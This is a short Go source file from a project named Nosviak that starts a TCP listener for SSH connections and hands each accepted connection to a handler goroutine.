package masters

import (
	"Nosviak/core/models/configs/json"
	"fmt"
	"log"
	"net"

	"golang.org/x/crypto/ssh"
)


//starts a the new listener safely
func NewListener(hst ssh.ServerConfig) error {

	//trys to correctly start the listener on that port
	Network, err := net.Listen("tcp", json.ContentConfig.Masters.Masters)
	if err != nil {
		return err
	}

	log.Println("[Clients] (SSH connection watcher has been started safely) {"+json.ContentConfig.Masters.Masters+"}")

	go TitleWorker()

	//for loops through all connections
	for {
		//accepts the new incoming connection
		conn, err := Network.Accept()
		if err != nil {
			return err
		}

		fmt.Println("New tcp connection established from "+conn.RemoteAddr().String()+" safely")


		//handles the incoming socket safely
		go HandleSocket(conn, &hst)
	}


	
}